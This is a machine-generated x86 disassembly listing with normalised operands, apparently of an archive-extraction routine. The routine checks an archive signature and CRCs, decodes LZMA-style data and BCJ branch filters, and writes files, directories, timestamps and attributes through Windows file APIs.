jb r-xdata
ja r-xdata
add edi [ ebp - 0x38 ]
mov eax [ ebp - 0x60 ]
adc eax [ ebp - 0x34 ]
add edi 0x20
adc eax 0x0
cmp [ ebp - 0x2c ] eax
jb r-xdata
cmp edx esi
jb r-xdata
ja r-xdata
push ecx
push esi
mov ecx ebx
call sub_405c20
add esp 0x8
test eax eax
jne r-xdata
cmp edx edi
jb r-xdata
mov esi [ ebp - 0x54 ]
push [ ebp - 0x3c ]
mov edx esi
lea ecx [ ebp - 0x48 ]
call sub_401a90
add esp 0x4
test eax eax
je r-xdata
mov edi [ ebp - 0x48 ]
push esi
mov edx edi
mov ecx ebx
call sub_405c60
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov eax [ ebp - 0x3c ]
push edi
push eax
mov eax [ eax + 0x4 ]
call eax
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
push rw-data
push [ ebp - 0x54 ]
mov edx edi
or ecx 0xffffffff
lea esi [ eax + 0x10 ]
call [ rw-data ]
not eax
cmp eax [ ebp - 0x4c ]
jne r-xdata
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x48 ]
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x4c ] eax
call sub_403010
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp - 0x48 ]
cmp eax 0x17
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x44 ] esi
jne r-xdata
mov esi 0x4
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
push [ ebp - 0x3c ]
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x50 ]
push [ eax + 0x24 ]
mov ecx ebx
push [ eax + 0x20 ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] esi
call sub_404dd0
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp - 0x3c ]
mov ecx [ ebp - 0x5c ]
push [ ebp - 0x64 ]
lea edx [ ebp - 0x50 ]
call sub_404be0
add esp 0x8
mov esi eax
mov eax [ ebp - 0x3c ]
push edi
push eax
mov eax [ eax + 0x4 ]
call eax
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x3c ]
push edi
push eax
mov eax [ eax + 0x4 ]
call eax
mov eax [ ebp - 0x54 ]
mov edi [ ebp - 0x58 ]
add esp 0x8
lea edx [ ebp - 0x48 ]
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x4c ] eax
call sub_403010
mov esi eax
mov ebx [ ebp - 0x3c ]
push [ ebp - 0x58 ]
mov eax [ ebx + 0x4 ]
push ebx
call eax
add esp 0x8
jmp r-xdata
mov eax [ ebp - 0x48 ]
test esi esi
jne r-xdata
sub_405220
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov [ ebp - 0x38 ] edx
mov edx ecx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x48 ] eax
mov eax [ edx + 0x3c ]
mov eax [ eax + esi * 4 ]
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x3c ]
xor ebx ebx
mov [ edi ] ebx
mov [ ecx ] ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
cmp eax 0xffffffff
jne r-xdata
cmp [ ecx ] ebx
je r-xdata
push [ ecx ]
mov eax [ ebp - 0x34 ]
push eax
mov eax [ eax + 0x4 ]
call eax
mov ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
mov [ ecx ] 0xffffffff
mov ecx [ ebp - 0x14 ]
add esp 0x8
mov [ ecx ] ebx
mov [ eax ] ebx
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
lea ecx [ eax + eax * 4 ]
mov eax [ edx + 0xc ]
lea eax [ eax + ecx * 8 ]
mov ecx eax
mov [ ebp - 0x30 ] eax
call sub_402c00
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x2c ]
mov ecx [ ebx + 0x34 ]
mov [ ebp - 0x20 ] eax
lea eax [ edx * 4 ]
mov [ ebp - 0x18 ] eax
mov edx eax
mov eax [ ebx + 0x30 ]
mov eax [ edx + eax ]
mov edx [ ecx + eax * 8 ]
add edx [ ebx + 0x28 ]
mov eax [ ecx + eax * 8 + 0x4 ]
adc eax [ ebx + 0x2c ]
xor ecx ecx
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x44 ] edx
mov edx [ ebp - 0x2c ]
cmp eax eax
jne r-xdata
mov ecx [ ebp - 0x28 ]
cmp [ ecx ] eax
je r-xdata
mov eax 0x2
cmp ecx [ ebp - 0xc ]
jne r-xdata
mov ecx esi
shl ecx 0x5
add ecx [ edx + 0x10 ]
mov [ edi ] 0x0
mov eax [ edx + 0x38 ]
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ecx
mov eax [ eax + edx * 4 ]
mov edx [ ebp - 0x1c ]
cmp eax esi
jae r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] edx
push [ ecx ]
mov eax [ ebp - 0x34 ]
push eax
mov eax [ eax + 0x4 ]
call eax
mov eax [ ebp - 0x14 ]
push 0x0
mov [ eax ] 0x0
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov eax [ eax + 0xc ]
call eax
add esp 0x14
test eax eax
jne r-xdata
mov eax [ ebp - 0x3c ]
mov esi [ ecx + 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax ] esi
mov edi [ edi ]
lea eax [ esi + edi ]
cmp eax [ edx ]
jbe r-xdata
mov ecx eax
shl ecx 0x5
sub esi eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x24 ]
mov [ ecx ] eax
test eax eax
je r-xdata
cmp [ ecx + 0x1b ] 0x0
je r-xdata
mov eax 0xb
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ edx + 0x10 ]
lea ecx [ ecx + 0x20 ]
mov eax [ ecx + eax - 0x18 ]
add [ edi ] eax
dec esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
push [ ebp - 0x48 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x14 ]
push [ eax ]
mov eax [ ebx + 0x30 ]
push [ ebp - 0x40 ]
mov ecx [ ecx + eax ]
push [ ebp - 0x44 ]
mov eax [ ebx ]
push edx
lea edx [ eax + ecx * 8 ]
mov ecx [ ebp - 0x30 ]
call sub_4027e0
mov ebx eax
add esp 0x18
test ebx ebx
jne r-xdata
push eax
mov eax [ ebp - 0x34 ]
push eax
mov eax [ eax ]
call eax
mov ecx [ ebp - 0x14 ]
add esp 0x8
mov [ ecx ] eax
test eax eax
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
push rw-data
mov edx [ eax ]
add edx edi
push esi
or ecx 0xffffffff
call [ rw-data ]
mov ecx [ ebp - 0x18 ]
not eax
cmp eax [ ecx + 0x10 ]
mov edx 0x3
cmovne ebx edx
mov eax [ ebp - 0x30 ]
cmp [ eax + 0x1c ] ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov ebx 0x2
mov eax ebx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
push rw-data
push eax
mov eax [ ebp - 0x14 ]
or ecx 0xffffffff
mov edx [ eax ]
call [ rw-data ]
mov ecx [ ebp - 0x30 ]
not eax
cmp eax [ ecx + 0x20 ]
je r-xdata
mov ebx 0x3
mov eax ebx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
sub_4054e0
push ebp
mov ebp esp
mov eax 0x8010
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x800c ] edx
mov [ ebp - 0x8008 ] ecx
mov [ edx ] ebx
mov [ edx + 0x4 ] ebx
lea ecx [ ecx ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8010 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x8008 ]
add ebx eax
cmp ebx 0x20
jbe r-xdata
mov eax 0x8000
sub eax ebx
mov [ ebp - 0x8010 ] eax
lea eax [ ebp - 0x8010 ]
lea edx [ ebp - 0x8004 ]
push eax
add edx ebx
call sub_402860
add esp 0x4
test eax eax
jne r-xdata
lea edi [ ebx - 0x20 ]
xor esi esi
test edi edi
je r-xdata
mov esi [ ebp - 0x800c ]
lea eax [ ebp - 0x8004 ]
add [ esi ] edi
adc [ esi + 0x4 ] 0x0
sub ebx edi
add eax edi
push ebx
push eax
lea eax [ ebp - 0x8004 ]
push eax
call sub_4170d0
add esp 0xc
cmp [ esi + 0x4 ] 0x0
ja r-xdata
cmp [ ebp + esi - 0x8004 ] 0x37
je r-xdata
cmp [ esi ] __dos_header
ja r-xdata
cmp esi edi
lea ebx [ ebx ]
mov ecx [ ebp - 0x8008 ]
jmp r-xdata
mov eax [ ebp + esi - 0x8004 ]
mov ecx rw-data
cmp eax [ ecx ]
jne r-xdata
je r-xdata
inc esi
cmp [ ebp + esi - 0x8004 ] 0x37
jne r-xdata
inc esi
cmp esi edi
jb r-xdata
movzx eax [ ebp + esi - 0x8000 ]
cmp ax [ ecx + 0x4 ]
jne r-xdata
cmp esi edi
jae r-xdata
push rw-data
lea edx [ ebp - 0x7ff8 ]
push 0x14
add edx esi
or ecx 0xffffffff
call [ rw-data ]
not eax
cmp eax [ ebp + esi - 0x7ffc ]
je r-xdata
mov edx [ ebp - 0x800c ]
pop edi
add [ edx ] esi
pop esi
mov eax 0x1
adc [ edx + 0x4 ] 0x0
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
sub_405640
push ebp
mov ebp esp
mov eax 0x4944
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor eax eax
push 0x61a
push eax
mov [ ebp - 0x628 ] ax
lea eax [ ebp - 0x626 ]
push eax
mov esi edx
mov [ ebp - 0x48c8 ] ecx
xor edi edi
call sub_41cae0
mov ebx esi
add esp 0xc
lea ecx [ ebx + 0x2 ]
mov ax [ ebx ]
add ebx 0x2
test ax ax
jne r-xdata
push esi
lea eax [ ebp - 0x628 ]
sub ebx ecx
push 0x30e
push eax
sar ebx 0x1
call sub_417a48
add esp 0xc
cmp [ esi + ebx * 2 - 0x2 ] 0x5c
je r-xdata
call sub_401ae0
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push [ ebp - 0x48c8 ]
mov [ ebp - 0x898 ] sub_401a60
mov [ ebp - 0x894 ] sub_401a80
mov [ ebp - 0x8a0 ] sub_401a60
mov [ ebp - 0x89c ] sub_401a80
mov [ ebp - 0x634 ] sub_402a50
mov [ ebp - 0x630 ] sub_402a70
mov [ ebp - 0x48c0 ] sub_405cd0
mov [ ebp - 0x48bc ] sub_405d30
mov [ ebp - 0x48b8 ] sub_405d40
mov [ ebp - 0x48b4 ] sub_405d90
call [ CreateFileW@IAT ]
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x62c ] eax
cmp eax 0xffffffff
jne r-xdata
push r--data
lea eax [ ebp - 0x628 ]
push 0x30e
push eax
call sub_4179dc
lea ebx [ ebp - 0x628 ]
add esp 0xc
lea ecx [ ebx + 0x2 ]
xorps xmm0 xmm0
lea edx [ ebp - 0x48e8 ]
lea ecx [ ebp - 0x62c ]
movlpd [ ebp - 0x48e8 ] xmm0
call sub_4054e0
test eax eax
jne r-xdata
call esi
test eax eax
je r-xdata
mov ax [ ebx ]
add ebx 0x2
test ax ax
jne r-xdata
sub ebx ecx
sar ebx 0x1
push 0x0
lea edx [ ebp - 0x48e8 ]
lea ecx [ ebp - 0x62c ]
call sub_4029a0
add esp 0x4
test eax eax
je r-xdata
lea edi [ eax + 0xb ]
jmp r-xdata
mov edi 0xb
jmp r-xdata
lea eax [ ebp - 0x634 ]
mov [ ebp - 0x48b0 ] eax
mov [ ebp - 0x48a8 ] edi
mov [ ebp - 0x48ac ] edi
mov edi 0xb
jmp r-xdata
lea ecx [ ebp - 0x4940 ]
call sub_402d00
test edi edi
jne r-xdata
push [ ebp - 0x4910 ]
lea eax [ ebp - 0x898 ]
push eax
call [ ebp - 0x894 ]
push [ ebp - 0x490c ]
lea eax [ ebp - 0x898 ]
push eax
call [ ebp - 0x894 ]
push [ ebp - 0x4908 ]
lea eax [ ebp - 0x898 ]
push eax
call [ ebp - 0x894 ]
push [ ebp - 0x4904 ]
lea eax [ ebp - 0x898 ]
push eax
call [ ebp - 0x894 ]
push [ ebp - 0x4900 ]
lea eax [ ebp - 0x898 ]
push eax
call [ ebp - 0x894 ]
push [ ebp - 0x48fc ]
lea eax [ ebp - 0x898 ]
push eax
call [ ebp - 0x894 ]
add esp 0x30
lea edx [ ebp - 0x898 ]
lea ecx [ ebp - 0x4940 ]
mov [ ebp - 0x48fc ] 0x0
mov [ ebp - 0x48f8 ] 0x0
call sub_402c50
mov eax [ ebp - 0x62c ]
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x8a0 ]
push eax
lea eax [ ebp - 0x898 ]
push eax
lea edx [ ebp - 0x48c0 ]
call sub_404e80
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
test edi edi
pop edi
setne al
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
xor edx edx
mov [ ebp - 0x48e4 ] 0xffffffff
mov [ ebp - 0x48cc ] 0x0
mov [ ebp - 0x48ec ] 0x0
mov [ ebp - 0x48d8 ] edx
cmp [ ebp - 0x4924 ] edx
jbe r-xdata
lea edx [ ebp - 0x898 ]
lea ecx [ ebp - 0x4940 ]
call sub_402d70
test edi edi
jne r-xdata
call esi
push [ ebp - 0x48cc ]
lea eax [ ebp - 0x898 ]
push eax
call [ ebp - 0x894 ]
add esp 0x8
xor ecx ecx
mov [ ebp - 0x48c8 ] ecx
nop
mov edi 0xb
lea esi [ ebp - 0x628 ]
lea esi [ esi + ebx * 2 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x8a0 ]
push eax
lea eax [ ebp - 0x898 ]
push eax
lea eax [ ebp - 0x48c4 ]
push eax
lea eax [ ebp - 0x48dc ]
push eax
lea eax [ ebp - 0x48ec ]
push eax
lea eax [ ebp - 0x48cc ]
push eax
lea eax [ ebp - 0x48e4 ]
push eax
push [ ebp - 0x48d8 ]
lea edx [ ebp - 0x48c0 ]
lea ecx [ ebp - 0x4940 ]
call sub_405220
mov edi eax
add esp 0x20
mov [ ebp - 0x48d0 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x48fc ]
lea esi [ eax + ecx * 2 ]
test edx edx
je r-xdata
mov esi [ GetLastError@IAT ]
jmp r-xdata
cmp [ esi ] di
je r-xdata
lea esi [ ebp - 0x628 ]
lea esi [ esi + ebx * 2 ]
lea eax [ ebp - 0x628 ]
lea eax [ eax + ebx * 2 ]
mov ecx eax
sub esi eax
mov eax [ ebp - 0x48d4 ]
cmp [ eax + 0x19 ] 0x0
je r-xdata
lea eax [ ebp - 0x628 ]
lea eax [ eax + ebx * 2 ]
mov ax [ esi + ecx ]
mov [ ecx ] ax
lea ecx [ ecx + 0x2 ]
dec edx
jne r-xdata
lea eax [ ebp - 0x890 ]
push eax
lea eax [ ebp - 0x628 ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push 0x0
lea eax [ ebp - 0x628 ]
push eax
call [ CreateDirectoryW@IAT ]
mov esi [ GetLastError@IAT ]
test eax eax
jne r-xdata
inc edi
cmp [ eax + edi * 2 ] 0x0
lea esi [ eax + edi * 2 ]
jne r-xdata
xor eax eax
push eax
mov [ esi ] ax
lea eax [ ebp - 0x628 ]
push eax
call [ CreateDirectoryW@IAT ]
test eax eax
jne r-xdata
push eax
call [ FindClose@IAT ]
mov esi [ GetLastError@IAT ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x628 ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x48e0 ] eax
cmp eax 0xffffffff
jne r-xdata
mov edi [ ebp - 0x48d0 ]
call esi
cmp [ esi ] 0x2f
jne r-xdata
mov eax 0x5c
mov [ esi ] ax
lea eax [ ebp - 0x628 ]
lea eax [ eax + ebx * 2 ]
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x48cc ]
mov edx [ ebp - 0x48dc ]
mov esi [ ebp - 0x48c4 ]
lea eax [ ebp - 0x48c4 ]
lea edx [ edx + ecx ]
push eax
lea ecx [ ebp - 0x48e0 ]
mov [ ebp - 0x48c4 ] esi
call sub_402900
add esp 0x4
test eax eax
jne r-xdata
mov esi [ GetLastError@IAT ]
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x4930 ]
add eax ecx
mov [ ebp - 0x48d4 ] eax
mov eax [ ebp - 0x4900 ]
mov [ ebp - 0x48dc ] 0x0
mov ecx [ eax + edx * 4 ]
mov edx [ eax + edx * 4 + 0x4 ]
sub edx ecx
mov [ ebp - 0x48c4 ] 0x0
cmp edx 0x104
jae r-xdata
jmp r-xdata
mov edi 0xb
jmp r-xdata
cmp [ ebp - 0x48c4 ] esi
je r-xdata
mov ecx [ ebp - 0x48d4 ]
mov esi [ ebp - 0x48e0 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov edi [ ebp - 0x48d0 ]
cmp esi 0xffffffff
je r-xdata
mov eax [ ecx ]
mov [ ebp - 0x63c ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x638 ] eax
lea eax [ ebp - 0x63c ]
push eax
push 0x0
push 0x0
push esi
call [ SetFileTime@IAT ]
mov esi [ GetLastError@IAT ]
xor eax eax
push esi
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov esi [ GetLastError@IAT ]
call esi
jmp r-xdata
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x48d4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov edx [ ebp - 0x48d8 ]
mov ecx [ ebp - 0x48c8 ]
inc edx
add ecx 0x20
mov [ ebp - 0x48d8 ] edx
mov [ ebp - 0x48c8 ] ecx
cmp edx [ ebp - 0x4924 ]
jb r-xdata
push [ eax + 0x14 ]
lea eax [ ebp - 0x628 ]
push eax
call [ SetFileAttributesW@IAT ]
jmp r-xdata
sub_405c20
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ecx + 0xc ]
push ecx
call eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0xc
call sub_4170bc
mov esp ebp
pop ebp
retn
sub_405c60
push ebp
mov ebp esp
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi edx
mov ebx ecx
test esi esi
je r-xdata
xor eax eax
mov edi edi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x6
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
add edi eax
sub esi eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push edi
push ebx
mov [ ebp - 0x8 ] esi
call eax
add esp 0xc
test eax eax
jne r-xdata
sub_405cd0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor edx edx
mov eax [ edi + 0x18 ]
sub eax [ edi + 0x14 ]
jne r-xdata
cmp eax [ esi ]
jae r-xdata
cmp [ esi ] edx
jbe r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ edi + 0x1c ]
add ecx [ edi + 0x14 ]
pop edi
mov [ eax ] ecx
mov eax edx
pop esi
pop ebp
retn
mov [ esi ] eax
mov [ edi + 0x14 ] edx
cmp [ esi ] 0x4000
jbe r-xdata
mov ecx [ edi + 0x10 ]
push esi
lea eax [ edi + 0x1c ]
push eax
mov eax [ ecx ]
push ecx
call eax
mov edx eax
mov eax [ esi ]
add esp 0xc
mov [ edi + 0x18 ] eax
mov [ esi ] 0x4000
sub_405d40
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov ecx [ ebx + 0x14 ]
mov edi [ ebx + 0x18 ]
sub edi ecx
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
lea eax [ ebx + 0x1c ]
cmp edi [ esi ]
cmova edi [ esi ]
push edi
add eax ecx
push eax
push [ ebp + 0xc ]
call sub_41a1a0
add [ ebx + 0x14 ] edi
add esp 0xc
mov [ esi ] edi
pop esi
pop edi
xor eax eax
pop ebx
pop ebp
retn
mov eax [ ebx + 0x10 ]
pop edi
pop ebx
mov [ ebp + 0x8 ] eax
mov eax [ eax ]
pop ebp
jmp eax
sub_405db0
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x220 ] eax
push ebx
push esi
mov eax 0x400
movzx esi ax
mov eax esi
shl esi 0x10
or eax esi
push edi
mov [ ebp - 0x21c ] ecx
mov ecx 0x81
lea edi [ ebp - 0x208 ]
[ edi ]
mov eax [ ebp + 0x1c ]
mov edi [ ebp + 0x18 ]
add eax edi
mov [ ebp - 0x218 ] eax
or eax 0xffffffff
mov [ ebp - 0x224 ] edx
xor ebx ebx
xor dl dl
xor esi esi
mov [ ebp - 0x210 ] 0x0
mov [ ebp - 0x214 ] eax
xor ecx ecx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
movzx eax [ edi ]
shl esi 0x8
inc edi
inc ecx
or esi eax
mov [ ebp + 0x18 ] edi
cmp ecx 0x5
jl r-xdata
cmp edi [ ebp - 0x218 ]
je r-xdata
mov eax [ ebp + 0x24 ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x224 ]
sub edi [ ebp - 0x210 ]
sub eax ebx
cmp eax edi
cmovb edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x24 ]
mov eax [ ebp - 0x210 ]
lea ecx [ ecx ]
mov ecx [ ebp + 0x24 ]
cmp ebx ecx
je r-xdata
cmp dl 0xf
jne r-xdata
pop edi
xor eax eax
cmp ebx ecx
pop esi
setne al
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x210 ]
mov ecx [ ebp - 0x21c ]
inc eax
mov cl [ ecx + eax - 0x1 ]
mov [ ebp - 0x209 ] cl
mov [ ebp - 0x210 ] eax
cmp cl 0xe8
jne r-xdata
mov eax [ ebp - 0x210 ]
inc eax
mov [ ebp - 0x210 ] eax
mov dl cl
dec edi
jne r-xdata
mov al cl
and al 0xf0
cmp al 0x80
je r-xdata
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x6 ]
cmp cl 0xe9
cmovne edx eax
movzx eax dl
lea edx [ ebp - 0x208 ]
lea edx [ edx + eax * 2 ]
jmp r-xdata
mov ecx [ ebp - 0x21c ]
inc ebx
mov cl [ ecx + eax ]
mov eax [ ebp - 0x220 ]
mov [ eax + ebx - 0x1 ] cl
mov al cl
and al 0xfe
cmp al 0xe8
je r-xdata
sub eax ecx
mov [ ebp - 0x214 ] eax
mov eax edi
shr eax 0x5
sub edi eax
mov eax [ ebp - 0x214 ]
sub esi ecx
mov [ edx ] di
cmp eax 0x1000000
jae r-xdata
mov eax 0x800
sub eax edi
shr eax 0x5
add eax edi
mov [ ebp - 0x214 ] ecx
mov [ edx ] ax
cmp ecx 0x1000000
jae r-xdata
mov eax [ ebp - 0x214 ]
movzx edi [ edx ]
mov ecx eax
shr ecx 0xb
imul ecx edi
cmp esi ecx
jae r-xdata
cmp [ ebp - 0x209 ] 0xe8
jne r-xdata
mov ecx [ ebp + 0x18 ]
cmp ecx [ ebp - 0x218 ]
je r-xdata
mov dl [ ebp - 0x209 ]
mov eax [ ebp + 0x24 ]
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx [ ebp - 0x218 ]
je r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov ecx edx
cmp eax 0x4
jb r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx edx
cmp eax 0x4
jb r-xdata
shl eax 0x8
mov [ ebp - 0x214 ] eax
movzx eax [ ecx ]
shl esi 0x8
or esi eax
inc ecx
mov [ ebp + 0x18 ] ecx
mov eax ecx
shl eax 0x8
mov [ ebp - 0x214 ] eax
movzx eax [ edx ]
shl esi 0x8
or esi eax
inc edx
mov [ ebp + 0x18 ] edx
add edx 0x4
sub eax 0x4
mov [ ebp + 0x10 ] edx
mov [ ebp + 0x14 ] eax
add edx 0x4
sub eax 0x4
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax edx
shr eax 0x8
mov [ ecx + ebx ] al
inc ebx
cmp ebx [ ebp + 0x24 ]
je r-xdata
movzx edx [ ecx ]
movzx eax [ ecx + 0x1 ]
shl edx 0x8
or edx eax
movzx eax [ ecx + 0x2 ]
shl edx 0x8
or edx eax
movzx eax [ ecx + 0x3 ]
mov ecx [ ebp - 0x220 ]
shl edx 0x8
or edx eax
sub edx ebx
sub edx 0x4
mov [ ecx + ebx ] dl
inc ebx
cmp ebx [ ebp + 0x24 ]
je r-xdata
mov eax edx
shr eax 0x10
mov [ ecx + ebx ] al
mov eax [ ebp + 0x24 ]
inc ebx
cmp ebx eax
je r-xdata
mov ecx eax
jmp r-xdata
shr edx 0x18
mov [ ecx + ebx ] dl
inc ebx
jmp r-xdata
sub_406090
push esi
mov esi edx
push edi
mov edi ecx
cmp esi 0x4
jae r-xdata
sub esi 0x4
xor eax eax
pop edi
xor eax eax
pop esi
retn
add eax 0x4
cmp eax esi
jbe r-xdata
movzx edx [ eax + edi + 0x2 ]
movzx ecx [ eax + edi + 0x1 ]
shl edx 0x8
or edx ecx
movzx ecx [ eax + edi ]
shl edx 0x8
or edx ecx
shl edx 0x2
sub edx eax
sub edx 0x8
shr edx 0x2
mov ecx edx
shr ecx 0x10
mov [ eax + edi + 0x2 ] cl
mov ecx edx
shr ecx 0x8
mov [ eax + edi + 0x1 ] cl
mov [ eax + edi ] dl
cmp [ eax + edi + 0x3 ] 0xeb
jne r-xdata
pop edi
pop esi
retn
sub_4060f0
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
push edi
mov esi [ esi ]
mov eax ecx
xor edi edi
and esi 0x7
mov [ ebp - 0x4 ] eax
cmp edx 0x5
jae r-xdata
push ebx
lea ecx [ edx - 0x4 ]
or ebx 0xffffffff
add ecx eax
mov [ ebp - 0x8 ] ecx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov edi edx
sub edi eax
cmp edx ecx
mov ecx edi
jae r-xdata
mov al [ edx ]
and al 0xfe
cmp al 0xe8
je r-xdata
sub ecx ebx
pop ebx
cmp ecx 0x3
jbe r-xdata
sub ecx ebx
